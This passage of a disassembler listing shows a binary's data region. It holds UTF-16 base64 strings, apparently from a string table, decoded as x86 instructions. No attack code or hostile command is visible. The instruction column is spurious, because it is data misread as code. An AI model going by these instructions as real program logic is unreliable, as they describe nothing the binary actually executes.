  40b18c:	00 6f 00             	add    %ch,0x0(%edi)
  40b18f:	6b 00 41             	imul   $0x41,(%eax),%eax
  40b192:	00 41 00             	add    %al,0x0(%ecx)
  40b195:	4f                   	dec    %edi
  40b196:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b199:	34 00                	xor    $0x0,%al
  40b19b:	30 00                	xor    %al,(%eax)
  40b19d:	59                   	pop    %ecx
  40b19e:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40b1a2:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40b1a6:	00 53 00             	add    %dl,0x0(%ebx)
  40b1a9:	62 00                	bound  %eax,(%eax)
  40b1ab:	42                   	inc    %edx
  40b1ac:	00 57 00             	add    %dl,0x0(%edi)
  40b1af:	7a 00                	jp     0x40b1b1
  40b1b1:	6d                   	insl   (%dx),%es:(%edi)
  40b1b2:	00 70 00             	add    %dh,0x0(%eax)
  40b1b5:	37                   	aaa
  40b1b6:	00 61 00             	add    %ah,0x0(%ecx)
  40b1b9:	5a                   	pop    %edx
  40b1ba:	00 69 00             	add    %ch,0x0(%ecx)
  40b1bd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1be:	00 39                	add    %bh,(%ecx)
  40b1c0:	00 71 00             	add    %dh,0x0(%ecx)
  40b1c3:	79 00                	jns    0x40b1c5
  40b1c5:	6b 00 58             	imul   $0x58,(%eax),%eax
  40b1c8:	00 35 00 52 00 34    	add    %dh,0x34005200
  40b1ce:	00 4a 00             	add    %cl,0x0(%edx)
  40b1d1:	41                   	inc    %ecx
  40b1d2:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1d5:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40b1d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1da:	00 73 00             	add    %dh,0x0(%ebx)
  40b1dd:	62 00                	bound  %eax,(%eax)
  40b1df:	6b 00 44             	imul   $0x44,(%eax),%eax
  40b1e2:	00 76 00             	add    %dh,0x0(%esi)
  40b1e5:	64 00 37             	add    %dh,%fs:(%edi)
  40b1e8:	00 77 00             	add    %dh,0x0(%edi)
  40b1eb:	6b 00 57             	imul   $0x57,(%eax),%eax
  40b1ee:	00 71 00             	add    %dh,0x0(%ecx)
  40b1f1:	4b                   	dec    %ebx
  40b1f2:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40b1f6:	00 31                	add    %dh,(%ecx)
  40b1f8:	00 38                	add    %bh,(%eax)
  40b1fa:	00 2f                	add    %ch,(%edi)
  40b1fc:	00 66 00             	add    %ah,0x0(%esi)
  40b1ff:	55                   	push   %ebp
  40b200:	00 4f 00             	add    %cl,0x0(%edi)
  40b203:	44                   	inc    %esp
  40b204:	00 75 00             	add    %dh,0x0(%ebp)
  40b207:	43                   	inc    %ebx
  40b208:	00 68 00             	add    %ch,0x0(%eax)
  40b20b:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40b20f:	46                   	inc    %esi
  40b210:	00 47 00             	add    %al,0x0(%edi)
  40b213:	59                   	pop    %ecx
  40b214:	00 73 00             	add    %dh,0x0(%ebx)
  40b217:	54                   	push   %esp
  40b218:	00 52 00             	add    %dl,0x0(%edx)
  40b21b:	79 00                	jns    0x40b21d
  40b21d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b21e:	00 73 00             	add    %dh,0x0(%ebx)
  40b221:	2f                   	das
  40b222:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40b226:	00 62 00             	add    %ah,0x0(%edx)
  40b229:	70 00                	jo     0x40b22b
  40b22b:	46                   	inc    %esi
  40b22c:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40b230:	00 61 00             	add    %ah,0x0(%ecx)
  40b233:	63 00                	arpl   %eax,(%eax)
  40b235:	45                   	inc    %ebp
  40b236:	00 73 00             	add    %dh,0x0(%ebx)
  40b239:	4f                   	dec    %edi
  40b23a:	00 31                	add    %dh,(%ecx)
  40b23c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40b240:	00 38                	add    %bh,(%eax)
  40b242:	00 30                	add    %dh,(%eax)
  40b244:	00 6d 00             	add    %ch,0x0(%ebp)
  40b247:	74 00                	je     0x40b249
  40b249:	55                   	push   %ebp
  40b24a:	00 66 00             	add    %ah,0x0(%esi)
  40b24d:	4c                   	dec    %esp
  40b24e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b251:	72 00                	jb     0x40b253
  40b253:	4e                   	dec    %esi
  40b254:	00 75 00             	add    %dh,0x0(%ebp)
  40b257:	34 00                	xor    $0x0,%al
  40b259:	2f                   	das
  40b25a:	00 42 00             	add    %al,0x0(%edx)
  40b25d:	71 00                	jno    0x40b25f
  40b25f:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40b263:	5a                   	pop    %edx
  40b264:	00 48 00             	add    %cl,0x0(%eax)
  40b267:	4e                   	dec    %esi
  40b268:	00 43 00             	add    %al,0x0(%ebx)
  40b26b:	30 00                	xor    %al,(%eax)
  40b26d:	4b                   	dec    %ebx
  40b26e:	00 31                	add    %dh,(%ecx)
  40b270:	00 56 00             	add    %dl,0x0(%esi)
  40b273:	6d                   	insl   (%dx),%es:(%edi)
  40b274:	00 68 00             	add    %ch,0x0(%eax)
  40b277:	78 00                	js     0x40b279
  40b279:	51                   	push   %ecx
  40b27a:	00 4f 00             	add    %cl,0x0(%edi)
  40b27d:	30 00                	xor    %al,(%eax)
  40b27f:	51                   	push   %ecx
  40b280:	00 4b 00             	add    %cl,0x0(%ebx)
  40b283:	57                   	push   %edi
  40b284:	00 33                	add    %dh,(%ebx)
  40b286:	00 59 00             	add    %bl,0x0(%ecx)
  40b289:	44                   	inc    %esp
  40b28a:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  40b28e:	00 75 00             	add    %dh,0x0(%ebp)
  40b291:	54                   	push   %esp
  40b292:	00 77 00             	add    %dh,0x0(%edi)
  40b295:	50                   	push   %eax
  40b296:	00 49 00             	add    %cl,0x0(%ecx)
  40b299:	45                   	inc    %ebp
  40b29a:	00 51 00             	add    %dl,0x0(%ecx)
  40b29d:	55                   	push   %ebp
  40b29e:	00 79 00             	add    %bh,0x0(%ecx)
  40b2a1:	6b 00 32             	imul   $0x32,(%eax),%eax
  40b2a4:	00 33                	add    %dh,(%ebx)
  40b2a6:	00 52 00             	add    %dl,0x0(%edx)
  40b2a9:	4d                   	dec    %ebp
  40b2aa:	00 6a 00             	add    %ch,0x0(%edx)
  40b2ad:	55                   	push   %ebp
  40b2ae:	00 75 00             	add    %dh,0x0(%ebp)
  40b2b1:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b2b5:	63 00                	arpl   %eax,(%eax)
  40b2b7:	79 00                	jns    0x40b2b9
  40b2b9:	68 00 2b 00 63       	push   $0x63002b00
  40b2be:	00 67 00             	add    %ah,0x0(%edi)
  40b2c1:	59                   	pop    %ecx
  40b2c2:	00 30                	add    %dh,(%eax)
  40b2c4:	00 55 00             	add    %dl,0x0(%ebp)
  40b2c7:	70 00                	jo     0x40b2c9
  40b2c9:	4f                   	dec    %edi
  40b2ca:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2cd:	50                   	push   %eax
  40b2ce:	00 46 00             	add    %al,0x0(%esi)
  40b2d1:	46                   	inc    %esi
  40b2d2:	00 43 00             	add    %al,0x0(%ebx)
  40b2d5:	54                   	push   %esp
  40b2d6:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40b2da:	00 38                	add    %bh,(%eax)
  40b2dc:	00 6d 00             	add    %ch,0x0(%ebp)
  40b2df:	70 00                	jo     0x40b2e1
  40b2e1:	75 00                	jne    0x40b2e3
  40b2e3:	4c                   	dec    %esp
  40b2e4:	00 57 00             	add    %dl,0x0(%edi)
  40b2e7:	55                   	push   %ebp
  40b2e8:	00 35 00 66 00 4e    	add    %dh,0x4e006600
  40b2ee:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b2f2:	00 65 00             	add    %ah,0x0(%ebp)
  40b2f5:	4d                   	dec    %ebp
  40b2f6:	00 46 00             	add    %al,0x0(%esi)
  40b2f9:	71 00                	jno    0x40b2fb
  40b2fb:	51                   	push   %ecx
  40b2fc:	00 50 00             	add    %dl,0x0(%eax)
  40b2ff:	4c                   	dec    %esp
  40b300:	00 68 00             	add    %ch,0x0(%eax)
  40b303:	41                   	inc    %ecx
  40b304:	00 4e 00             	add    %cl,0x0(%esi)
  40b307:	43                   	inc    %ebx
  40b308:	00 78 00             	add    %bh,0x0(%eax)
  40b30b:	2f                   	das
  40b30c:	00 6a 00             	add    %ch,0x0(%edx)
  40b30f:	47                   	inc    %edi
  40b310:	00 36                	add    %dh,(%esi)
  40b312:	00 79 00             	add    %bh,0x0(%ecx)
  40b315:	75 00                	jne    0x40b317
  40b317:	58                   	pop    %eax
  40b318:	00 78 00             	add    %bh,0x0(%eax)
  40b31b:	35 00 66 00 69       	xor    $0x69006600,%eax
  40b320:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40b324:	00 55 00             	add    %dl,0x0(%ebp)
  40b327:	38 00                	cmp    %al,(%eax)
  40b329:	45                   	inc    %ebp
  40b32a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b32d:	31 00                	xor    %eax,(%eax)
  40b32f:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40b333:	33 00                	xor    (%eax),%eax
  40b335:	63 00                	arpl   %eax,(%eax)
  40b337:	58                   	pop    %eax
  40b338:	00 56 00             	add    %dl,0x0(%esi)
  40b33b:	4d                   	dec    %ebp
  40b33c:	00 57 00             	add    %dl,0x0(%edi)
  40b33f:	6a 00                	push   $0x0
  40b341:	79 00                	jns    0x40b343
  40b343:	46                   	inc    %esi
  40b344:	00 68 00             	add    %ch,0x0(%eax)
  40b347:	62 00                	bound  %eax,(%eax)
  40b349:	41                   	inc    %ecx
  40b34a:	00 6f 00             	add    %ch,0x0(%edi)
  40b34d:	55                   	push   %ebp
  40b34e:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40b352:	00 6d 00             	add    %ch,0x0(%ebp)
  40b355:	47                   	inc    %edi
  40b356:	00 58 00             	add    %bl,0x0(%eax)
  40b359:	5a                   	pop    %edx
  40b35a:	00 61 00             	add    %ah,0x0(%ecx)
  40b35d:	42                   	inc    %edx
  40b35e:	00 67 00             	add    %ah,0x0(%edi)
  40b361:	70 00                	jo     0x40b363
  40b363:	31 00                	xor    %eax,(%eax)
  40b365:	78 00                	js     0x40b367
  40b367:	79 00                	jns    0x40b369
  40b369:	42                   	inc    %edx
  40b36a:	00 6e 00             	add    %ch,0x0(%esi)
  40b36d:	41                   	inc    %ecx
  40b36e:	00 49 00             	add    %cl,0x0(%ecx)
  40b371:	57                   	push   %edi
  40b372:	00 7a 00             	add    %bh,0x0(%edx)
  40b375:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40b379:	2f                   	das
  40b37a:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40b37e:	00 57 00             	add    %dl,0x0(%edi)
  40b381:	4b                   	dec    %ebx
  40b382:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40b386:	00 51 00             	add    %dl,0x0(%ecx)
  40b389:	6e                   	outsb  %ds:(%esi),(%dx)
  40b38a:	00 52 00             	add    %dl,0x0(%edx)
  40b38d:	76 00                	jbe    0x40b38f
  40b38f:	73 00                	jae    0x40b391
  40b391:	72 00                	jb     0x40b393
  40b393:	4d                   	dec    %ebp
  40b394:	00 59 00             	add    %bl,0x0(%ecx)
  40b397:	2b 00                	sub    (%eax),%eax
  40b399:	70 00                	jo     0x40b39b
  40b39b:	6a 00                	push   $0x0
  40b39d:	74 00                	je     0x40b39f
  40b39f:	31 00                	xor    %eax,(%eax)
  40b3a1:	6d                   	insl   (%dx),%es:(%edi)
  40b3a2:	00 50 00             	add    %dl,0x0(%eax)
  40b3a5:	6c                   	insb   (%dx),%es:(%edi)
  40b3a6:	00 61 00             	add    %ah,0x0(%ecx)
  40b3a9:	46                   	inc    %esi
  40b3aa:	00 51 00             	add    %dl,0x0(%ecx)
  40b3ad:	75 00                	jne    0x40b3af
  40b3af:	41                   	inc    %ecx
  40b3b0:	00 6e 00             	add    %ch,0x0(%esi)
  40b3b3:	70 00                	jo     0x40b3b5
  40b3b5:	57                   	push   %edi
  40b3b6:	00 6e 00             	add    %ch,0x0(%esi)
  40b3b9:	78 00                	js     0x40b3bb
  40b3bb:	45                   	inc    %ebp
  40b3bc:	00 6a 00             	add    %ch,0x0(%edx)
  40b3bf:	4d                   	dec    %ebp
  40b3c0:	00 7a 00             	add    %bh,0x0(%edx)
  40b3c3:	59                   	pop    %ecx
  40b3c4:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40b3c8:	00 32                	add    %dh,(%edx)
  40b3ca:	00 51 00             	add    %dl,0x0(%ecx)
  40b3cd:	50                   	push   %eax
  40b3ce:	00 31                	add    %dh,(%ecx)
  40b3d0:	00 59 00             	add    %bl,0x0(%ecx)
  40b3d3:	4d                   	dec    %ebp
  40b3d4:	00 66 00             	add    %ah,0x0(%esi)
  40b3d7:	76 00                	jbe    0x40b3d9
  40b3d9:	39 00                	cmp    %eax,(%eax)
  40b3db:	31 00                	xor    %eax,(%eax)
  40b3dd:	43                   	inc    %ebx
  40b3de:	00 69 00             	add    %ch,0x0(%ecx)
  40b3e1:	34 00                	xor    $0x0,%al
  40b3e3:	47                   	inc    %edi
  40b3e4:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40b3e8:	00 45 00             	add    %al,0x0(%ebp)
  40b3eb:	77 00                	ja     0x40b3ed
  40b3ed:	4b                   	dec    %ebx
  40b3ee:	00 76 00             	add    %dh,0x0(%esi)
  40b3f1:	37                   	aaa
  40b3f2:	00 6a 00             	add    %ch,0x0(%edx)
  40b3f5:	70 00                	jo     0x40b3f7
  40b3f7:	61                   	popa
  40b3f8:	00 6a 00             	add    %ch,0x0(%edx)
  40b3fb:	4f                   	dec    %edi
  40b3fc:	00 67 00             	add    %ah,0x0(%edi)
  40b3ff:	51                   	push   %ecx
  40b400:	00 2f                	add    %ch,(%edi)
  40b402:	00 65 00             	add    %ah,0x0(%ebp)
  40b405:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40b409:	73 00                	jae    0x40b40b
  40b40b:	4a                   	dec    %edx
  40b40c:	00 48 00             	add    %cl,0x0(%eax)
  40b40f:	54                   	push   %esp
  40b410:	00 70 00             	add    %dh,0x0(%eax)
  40b413:	2f                   	das
  40b414:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40b418:	00 4e 00             	add    %cl,0x0(%esi)
  40b41b:	57                   	push   %edi
  40b41c:	00 65 00             	add    %ah,0x0(%ebp)
  40b41f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b420:	00 47 00             	add    %al,0x0(%edi)
  40b423:	50                   	push   %eax
  40b424:	00 70 00             	add    %dh,0x0(%eax)
  40b427:	63 00                	arpl   %eax,(%eax)
  40b429:	53                   	push   %ebx
  40b42a:	00 69 00             	add    %ch,0x0(%ecx)
  40b42d:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40b431:	37                   	aaa
  40b432:	00 6d 00             	add    %ch,0x0(%ebp)
  40b435:	7a 00                	jp     0x40b437
  40b437:	35 00 57 00 70       	xor    $0x70005700,%eax
  40b43c:	00 31                	add    %dh,(%ecx)
  40b43e:	00 70 00             	add    %dh,0x0(%eax)
  40b441:	55                   	push   %ebp
  40b442:	00 6d 00             	add    %ch,0x0(%ebp)
  40b445:	63 00                	arpl   %eax,(%eax)
  40b447:	55                   	push   %ebp
  40b448:	00 36                	add    %dh,(%esi)
  40b44a:	00 59 00             	add    %bl,0x0(%ecx)
  40b44d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b44e:	00 43 00             	add    %al,0x0(%ebx)
  40b451:	42                   	inc    %edx
  40b452:	00 32                	add    %dh,(%edx)
  40b454:	00 51 00             	add    %dl,0x0(%ecx)
  40b457:	6b 00 33             	imul   $0x33,(%eax),%eax
  40b45a:	00 62 00             	add    %ah,0x0(%edx)
  40b45d:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40b461:	4a                   	dec    %edx
  40b462:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40b466:	00 66 00             	add    %ah,0x0(%esi)
  40b469:	57                   	push   %edi
  40b46a:	00 58 00             	add    %bl,0x0(%eax)
  40b46d:	68 00 67 00 3d       	push   $0x3d006700
  40b472:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40b478:	4b                   	dec    %ebx
  40b479:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40b47d:	00 30                	add    %dh,(%eax)
  40b47f:	00 6a 00             	add    %ch,0x0(%edx)
  40b482:	32 00                	xor    (%eax),%al
  40b484:	64 00 32             	add    %dh,%fs:(%edx)
  40b487:	00 66 00             	add    %ah,0x0(%esi)
  40b48a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b48b:	00 65 00             	add    %ah,0x0(%ebp)
  40b48e:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40b492:	52                   	push   %edx
  40b493:	00 39                	add    %bh,(%ecx)
  40b495:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40b499:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b49c:	42                   	inc    %edx
  40b49d:	00 36                	add    %dh,(%esi)
  40b49f:	00 61 00             	add    %ah,0x0(%ecx)
  40b4a2:	2f                   	das
  40b4a3:	00 33                	add    %dh,(%ebx)
  40b4a5:	00 76 00             	add    %dh,0x0(%esi)
  40b4a8:	56                   	push   %esi
  40b4a9:	00 49 00             	add    %cl,0x0(%ecx)
  40b4ac:	5a                   	pop    %edx
  40b4ad:	00 4b 00             	add    %cl,0x0(%ebx)
  40b4b0:	4f                   	dec    %edi
  40b4b1:	00 46 00             	add    %al,0x0(%esi)
  40b4b4:	71 00                	jno    0x40b4b6
  40b4b6:	39 00                	cmp    %eax,(%eax)
  40b4b8:	46                   	inc    %esi
  40b4b9:	00 7a 00             	add    %bh,0x0(%edx)
  40b4bc:	44                   	inc    %esp
  40b4bd:	00 49 00             	add    %cl,0x0(%ecx)
  40b4c0:	54                   	push   %esp
  40b4c1:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4c4:	7a 00                	jp     0x40b4c6
  40b4c6:	59                   	pop    %ecx
  40b4c7:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4ca:	56                   	push   %esi
  40b4cb:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40b4cf:	00 7a 00             	add    %bh,0x0(%edx)
  40b4d2:	43                   	inc    %ebx
  40b4d3:	00 41 00             	add    %al,0x0(%ecx)
  40b4d6:	32 00                	xor    (%eax),%al
  40b4d8:	43                   	inc    %ebx
  40b4d9:	00 67 00             	add    %ah,0x0(%edi)
  40b4dc:	74 00                	je     0x40b4de
  40b4de:	74 00                	je     0x40b4e0
  40b4e0:	61                   	popa
  40b4e1:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40b4e5:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40b4e9:	00 72 00             	add    %dh,0x0(%edx)
  40b4ec:	5a                   	pop    %edx
  40b4ed:	00 50 00             	add    %dl,0x0(%eax)
  40b4f0:	4a                   	dec    %edx
  40b4f1:	00 77 00             	add    %dh,0x0(%edi)
  40b4f4:	2b 00                	sub    (%eax),%eax
  40b4f6:	6a 00                	push   $0x0
  40b4f8:	47                   	inc    %edi
  40b4f9:	00 76 00             	add    %dh,0x0(%esi)
  40b4fc:	45                   	inc    %ebp
  40b4fd:	00 4f 00             	add    %cl,0x0(%edi)
  40b500:	33 00                	xor    (%eax),%eax
  40b502:	74 00                	je     0x40b504
  40b504:	66 00 30             	data16 add %dh,(%eax)
  40b507:	00 6b 00             	add    %ch,0x0(%ebx)
  40b50a:	62 00                	bound  %eax,(%eax)
  40b50c:	77 00                	ja     0x40b50e
  40b50e:	34 00                	xor    $0x0,%al
  40b510:	45                   	inc    %ebp
  40b511:	00 73 00             	add    %dh,0x0(%ebx)
  40b514:	51                   	push   %ecx
  40b515:	00 46 00             	add    %al,0x0(%esi)
  40b518:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40b51c:	73 00                	jae    0x40b51e
  40b51e:	38 00                	cmp    %al,(%eax)
  40b520:	70 00                	jo     0x40b522
  40b522:	41                   	inc    %ecx
  40b523:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b529:	80 b1 2f 00 4d 00 35 	xorb   $0x35,0x4d002f(%ecx)
  40b530:	00 35 00 78 00 52    	add    %dh,0x52007800
  40b536:	00 59 00             	add    %bl,0x0(%ecx)
  40b539:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40b53d:	6b 00 34             	imul   $0x34,(%eax),%eax
  40b540:	00 52 00             	add    %dl,0x0(%edx)
  40b543:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b547:	71 00                	jno    0x40b549
  40b549:	32 00                	xor    (%eax),%al
  40b54b:	66 00 38             	data16 add %bh,(%eax)
  40b54e:	00 73 00             	add    %dh,0x0(%ebx)
  40b551:	6e                   	outsb  %ds:(%esi),(%dx)
  40b552:	00 35 00 72 00 50    	add    %dh,0x50007200
  40b558:	00 4a 00             	add    %cl,0x0(%edx)
  40b55b:	39 00                	cmp    %eax,(%eax)
  40b55d:	6d                   	insl   (%dx),%es:(%edi)
  40b55e:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40b562:	00 4f 00             	add    %cl,0x0(%edi)
  40b565:	67 00 56 00          	add    %dl,0x0(%bp)
  40b569:	38 00                	cmp    %al,(%eax)
  40b56b:	4e                   	dec    %esi
  40b56c:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b570:	00 36                	add    %dh,(%esi)
  40b572:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40b576:	00 62 00             	add    %ah,0x0(%edx)
  40b579:	65 00 37             	add    %dh,%gs:(%edi)
  40b57c:	00 68 00             	add    %ch,0x0(%eax)
  40b57f:	57                   	push   %edi
  40b580:	00 77 00             	add    %dh,0x0(%edi)
  40b583:	42                   	inc    %edx
  40b584:	00 6b 00             	add    %ch,0x0(%ebx)
  40b587:	65 00 30             	add    %dh,%gs:(%eax)
  40b58a:	00 59 00             	add    %bl,0x0(%ecx)
  40b58d:	55                   	push   %ebp
  40b58e:	00 47 00             	add    %al,0x0(%edi)
  40b591:	63 00                	arpl   %eax,(%eax)
  40b593:	56                   	push   %esi
  40b594:	00 46 00             	add    %al,0x0(%esi)
  40b597:	62 00                	bound  %eax,(%eax)
  40b599:	49                   	dec    %ecx
  40b59a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b59d:	6d                   	insl   (%dx),%es:(%edi)
  40b59e:	00 56 00             	add    %dl,0x0(%esi)
  40b5a1:	4b                   	dec    %ebx
  40b5a2:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5a5:	62 00                	bound  %eax,(%eax)
  40b5a7:	38 00                	cmp    %al,(%eax)
  40b5a9:	67 00 44 00          	add    %al,0x0(%si)
  40b5ad:	6a 00                	push   $0x0
  40b5af:	55                   	push   %ebp
  40b5b0:	00 52 00             	add    %dl,0x0(%edx)
  40b5b3:	35 00 78 00 45       	xor    $0x45007800,%eax
  40b5b8:	00 7a 00             	add    %bh,0x0(%edx)
  40b5bb:	79 00                	jns    0x40b5bd
  40b5bd:	30 00                	xor    %al,(%eax)
  40b5bf:	34 00                	xor    $0x0,%al
  40b5c1:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40b5c5:	48                   	dec    %eax
  40b5c6:	00 30                	add    %dh,(%eax)
  40b5c8:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b5cc:	00 5a 00             	add    %bl,0x0(%edx)
  40b5cf:	71 00                	jno    0x40b5d1
  40b5d1:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40b5d5:	67 00 3d             	add    %bh,(%di)
  40b5d8:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40b5de:	39 00                	cmp    %eax,(%eax)
  40b5e0:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b5e4:	7a 00                	jp     0x40b5e6
  40b5e6:	74 00                	je     0x40b5e8
  40b5e8:	7a 00                	jp     0x40b5ea
  40b5ea:	71 00                	jno    0x40b5ec
  40b5ec:	6c                   	insb   (%dx),%es:(%edi)
  40b5ed:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40b5f1:	00 67 00             	add    %ah,0x0(%edi)
  40b5f4:	4b                   	dec    %ebx
  40b5f5:	00 57 00             	add    %dl,0x0(%edi)
  40b5f8:	46                   	inc    %esi
  40b5f9:	00 50 00             	add    %dl,0x0(%eax)
  40b5fc:	48                   	dec    %eax
  40b5fd:	00 7a 00             	add    %bh,0x0(%edx)
  40b600:	79 00                	jns    0x40b602
  40b602:	31 00                	xor    %eax,(%eax)
  40b604:	42                   	inc    %edx
  40b605:	00 30                	add    %dh,(%eax)
  40b607:	00 45 00             	add    %al,0x0(%ebp)
  40b60a:	6c                   	insb   (%dx),%es:(%edi)
  40b60b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b60e:	71 00                	jno    0x40b610
  40b610:	74 00                	je     0x40b612
  40b612:	52                   	push   %edx
  40b613:	00 55 00             	add    %dl,0x0(%ebp)
  40b616:	4f                   	dec    %edi
  40b617:	00 2b                	add    %ch,(%ebx)
  40b619:	00 4b 00             	add    %cl,0x0(%ebx)
  40b61c:	39 00                	cmp    %eax,(%eax)
  40b61e:	75 00                	jne    0x40b620
  40b620:	41                   	inc    %ecx
  40b621:	00 2b                	add    %ch,(%ebx)
  40b623:	00 39                	add    %bh,(%ecx)
  40b625:	00 36                	add    %dh,(%esi)
  40b627:	00 36                	add    %dh,(%esi)
  40b629:	00 36                	add    %dh,(%esi)
  40b62b:	00 57 00             	add    %dl,0x0(%edi)
  40b62e:	4b                   	dec    %ebx
  40b62f:	00 45 00             	add    %al,0x0(%ebp)
  40b632:	42                   	inc    %edx
  40b633:	00 4d 00             	add    %cl,0x0(%ebp)
  40b636:	76 00                	jbe    0x40b638
  40b638:	55                   	push   %ebp
  40b639:	00 52 00             	add    %dl,0x0(%edx)
  40b63c:	31 00                	xor    %eax,(%eax)
  40b63e:	4c                   	dec    %esp
  40b63f:	00 58 00             	add    %bl,0x0(%eax)
  40b642:	4e                   	dec    %esi
  40b643:	00 67 00             	add    %ah,0x0(%edi)
  40b646:	4d                   	dec    %ebp
  40b647:	00 69 00             	add    %ch,0x0(%ecx)
  40b64a:	62 00                	bound  %eax,(%eax)
  40b64c:	56                   	push   %esi
  40b64d:	00 53 00             	add    %dl,0x0(%ebx)
  40b650:	71 00                	jno    0x40b652
  40b652:	46                   	inc    %esi
  40b653:	00 33                	add    %dh,(%ebx)
  40b655:	00 36                	add    %dh,(%esi)
  40b657:	00 75 00             	add    %dh,0x0(%ebp)
  40b65a:	71 00                	jno    0x40b65c
  40b65c:	6d                   	insl   (%dx),%es:(%edi)
  40b65d:	00 4e 00             	add    %cl,0x0(%esi)
  40b660:	43                   	inc    %ebx
  40b661:	00 6e 00             	add    %ch,0x0(%esi)
  40b664:	7a 00                	jp     0x40b666
  40b666:	55                   	push   %ebp
  40b667:	00 57 00             	add    %dl,0x0(%edi)
  40b66a:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40b66e:	4e                   	dec    %esi
  40b66f:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40b673:	00 6e 00             	add    %ch,0x0(%esi)
  40b676:	54                   	push   %esp
  40b677:	00 5a 00             	add    %bl,0x0(%edx)
  40b67a:	43                   	inc    %ebx
  40b67b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b67e:	34 00                	xor    $0x0,%al
  40b680:	72 00                	jb     0x40b682
  40b682:	62 00                	bound  %eax,(%eax)
  40b684:	37                   	aaa
  40b685:	00 6d 00             	add    %ch,0x0(%ebp)
  40b688:	67 00 3d             	add    %bh,(%di)
  40b68b:	00 3d 00 00 03 33    	add    %bh,0x33030000
  40b691:	00 00                	add    %al,(%eax)
  40b693:	80 b1 31 00 2f 00 61 	xorb   $0x61,0x2f0031(%ecx)
  40b69a:	00 7a 00             	add    %bh,0x0(%edx)
  40b69d:	50                   	push   %eax
  40b69e:	00 58 00             	add    %bl,0x0(%eax)
  40b6a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6a2:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40b6a6:	00 78 00             	add    %bh,0x0(%eax)
  40b6a9:	37                   	aaa
  40b6aa:	00 56 00             	add    %dl,0x0(%esi)
  40b6ad:	55                   	push   %ebp
  40b6ae:	00 31                	add    %dh,(%ecx)
  40b6b0:	00 4e 00             	add    %cl,0x0(%esi)
  40b6b3:	37                   	aaa
  40b6b4:	00 67 00             	add    %ah,0x0(%edi)
  40b6b7:	38 00                	cmp    %al,(%eax)
  40b6b9:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40b6bd:	52                   	push   %edx
  40b6be:	00 62 00             	add    %ah,0x0(%edx)
  40b6c1:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  40b6c5:	41                   	inc    %ecx
  40b6c6:	00 67 00             	add    %ah,0x0(%edi)
  40b6c9:	39 00                	cmp    %eax,(%eax)
  40b6cb:	4d                   	dec    %ebp
  40b6cc:	00 78 00             	add    %bh,0x0(%eax)
  40b6cf:	4c                   	dec    %esp
  40b6d0:	00 52 00             	add    %dl,0x0(%edx)
